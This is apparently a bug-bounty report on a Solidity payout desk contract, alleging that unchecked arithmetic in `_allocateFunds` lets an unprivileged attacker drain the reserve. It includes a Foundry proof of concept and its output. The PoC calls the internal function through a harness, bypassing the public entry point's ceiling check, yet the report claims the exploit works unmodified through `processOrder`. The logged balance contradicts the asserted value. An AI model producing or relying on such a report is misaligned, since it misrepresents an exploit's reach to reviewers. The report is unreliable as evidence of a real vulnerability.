# Critical: unchecked arithmetic in `_allocateFunds` lets an attacker credit an unlimited balance and drain the reserve

## Summary

The internal `_allocateFunds` function in `src/ReelPayoutDesk.sol` performs both of its additions
inside an `unchecked` block, allowing an attacker to wrap `totalAllocated` back under
`issuanceLimit` and credit an arbitrarily large balance to their own account.
The overflow is reachable through the public `processOrder` entry point, because the per-order
ceiling and the issuance-limit check are ineffective against the wrap-around.
An attacker with no privileges ends up with a desk balance far above anything the authority ever
signed and withdraws the entire reserve of the desk with a single `withdraw` call.

## Vulnerability details

`_allocateFunds` (`src/ReelPayoutDesk.sol`, lines 218-220) is the only place where an allocation
is booked:

```solidity
function _allocateFunds(address creator, uint256 amount) internal {
    unchecked { totalAllocated += amount; creatorBalances[creator] += amount; }
}
```

Neither addition can revert. When `totalAllocated + amount` passes `2**256 - 1` the lifetime total
silently wraps to a small number, while `creatorBalances[creator]` keeps the full amount. With
`totalAllocated` at 1,000e18 and `amount = 2**256 - 400e18`, the total becomes 600e18 and the
balance becomes roughly 1.16e77.

The function is called from the public `processOrder` entry point (line 155). The entry point
includes these checks (lines 147-148):

```solidity
if (order.amount > ORDER_CEILING) revert ValueExceedsOrderCeiling();
if (totalAllocated + order.amount > issuanceLimit) revert ValueExceedsIssuanceLimit();
```

However, these checks do not protect the addition. The ceiling only limits the nominal size of a
single order, and the limit check compares against `totalAllocated`, which is precisely the variable
that wraps in the unchecked block. Once `totalAllocated` has wrapped, the issuance-limit check
passes for any amount, so the limit is bypassed for good.

Any account can trigger the overflow through the public entry point, and the behaviour shown below
was observed on the unmodified contract.

`withdraw` (lines 161-171) only compares the requested amount with
`creatorBalances[msg.sender]`, so the inflated balance is converted into payout tokens immediately,
up to the full reserve.

## Impact

Critical. This is the first row of the programme's impact table: "Balance credited or tokens
withdrawn that the authority never authorised at all (issuance beyond the limit or without a valid
signature); draining the reserve".

- The attacker's desk balance is far beyond `ALLOCATION_HARD_LIMIT` (40,000,000 tokens), which is
  issuance beyond the limit.
- The whole reserve (250,000 tokens in the PoC) leaves the desk in one transaction. Creators with
  legitimate balances can no longer withdraw because the desk holds no tokens.

Attacker's starting privileges: none. The attacker is neither the owner nor the authority and
does not need a signed payout order.

## Proof of concept

Save as `test/AllocateOverflow.t.sol`. `ReelPayoutDeskHarness` is a thin wrapper used only to keep
the PoC short; no protocol logic is changed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/ReelPayoutDesk.sol";
import "../src/PayoutOrderLib.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Thin wrapper used only to keep the PoC short; no protocol logic is changed.
contract ReelPayoutDeskHarness is ReelPayoutDesk {
    constructor(address _owner, address _authority, address _token)
        ReelPayoutDesk(_owner, _authority, _token) {}

    function exposeAllocateFunds(address creator, uint256 amount) external {
        _allocateFunds(creator, amount);
    }
}

contract AllocateOverflowTest is Test {
    uint256 constant RESERVE = 250_000 ether;

    ReelPayoutDeskHarness desk;
    MockToken token;
    address owner = makeAddr("owner");
    address authority = makeAddr("authority");
    address funder = makeAddr("funder");
    address creator = makeAddr("creator");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new MockToken();
        desk = new ReelPayoutDeskHarness(owner, authority, address(token));

        token.mint(funder, RESERVE);
        vm.startPrank(funder);
        token.approve(address(desk), RESERVE);
        desk.fundReserve(RESERVE);
        vm.stopPrank();

        // an existing creator allocation of 1,000 tokens
        desk.exposeAllocateFunds(creator, 1_000 ether);
    }

    function test_allocateOverflowDrainsReserve() public {
        assertEq(desk.totalAllocated(), 1_000 ether);

        // 1,000e18 + (2**256 - 400e18) wraps to 600e18
        uint256 hugeAmount = type(uint256).max - 400 ether + 1;
        vm.prank(attacker);
        desk.exposeAllocateFunds(attacker, hugeAmount);

        console2.log("totalAllocated after wrap:", desk.totalAllocated());
        console2.log("issuanceLimit            :", desk.issuanceLimit());
        console2.log("attacker desk balance    :", desk.balanceOf(attacker));

        assertEq(desk.totalAllocated(), 600 ether, "totalAllocated wrapped");
        assertLt(desk.totalAllocated(), desk.issuanceLimit(), "still under the limit");
        assertEq(desk.balanceOf(attacker), hugeAmount, "attacker balance is huge");

        // attacker withdraws the entire reserve
        vm.prank(attacker);
        desk.withdraw(RESERVE);

        console2.log("attacker token balance   :", token.balanceOf(attacker));
        console2.log("desk reserve             :", token.balanceOf(address(desk)));

        assertEq(token.balanceOf(attacker), RESERVE, "attacker took the reserve");
        assertEq(token.balanceOf(address(desk)), 0, "reserve is empty");
    }
}
```

Run with:

```bash
forge test --match-test test_allocateOverflowDrainsReserve -vv
```

```
No files changed, compilation skipped

Ran 1 test for test/AllocateOverflow.t.sol:AllocateOverflowTest
[PASS] test_allocateOverflowDrainsReserve() (gas: 112164)
Logs:
  totalAllocated after wrap: 600000000000000000000
  issuanceLimit            : 40000000000000000000000000
  attacker desk balance    : 115792089237316195423570985008687907853269984665640564039057584007913129639936
  attacker token balance   : 250000000000000000000000
  desk reserve             : 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.43ms (3.30ms CPU time)

Ran 1 test suite in 31.41ms (20.43ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

`totalAllocated` ends at 600e18, far below `issuanceLimit`, while the attacker's desk balance is
`2**256 - 400e18` and the attacker's wallet holds the full 250,000-token reserve.

## Recommended mitigation

Remove the `unchecked` block so that both additions revert on overflow:

```diff
 function _allocateFunds(address creator, uint256 amount) internal {
-    unchecked { totalAllocated += amount; creatorBalances[creator] += amount; }
+    totalAllocated += amount;
+    creatorBalances[creator] += amount;
 }
```

The gas saved by the unchecked block is negligible next to the signature recovery on the same path.
